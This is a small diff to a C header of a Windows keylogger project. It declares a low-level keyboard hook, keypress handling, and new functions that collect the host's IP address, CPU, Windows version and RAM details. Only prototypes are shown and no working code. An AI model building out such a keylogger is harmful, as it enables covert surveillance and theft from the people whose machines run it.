@@ -3,9 +3,7 @@
 
 #include "logs.h"
 
-#include <windows.h>
-#include <stdio.h>
-
+typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
 
 #define _WIN32_WINNT 0x0A00
 
@@ -24,8 +22,16 @@ typedef struct s_key {
 }	t_key;
 
 
-int	    handleKeyPress(t_key *keyData);
+int		handleKeyPress(t_key *keyData);
 void	initKeylogger(t_key *keyData);
+
+void	get_ip_address(void);
+void	get_cpu_info(void);
+void	get_windows_info(void);
+void	get_ram_info(void);
+
+
+int		already_running(void);
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
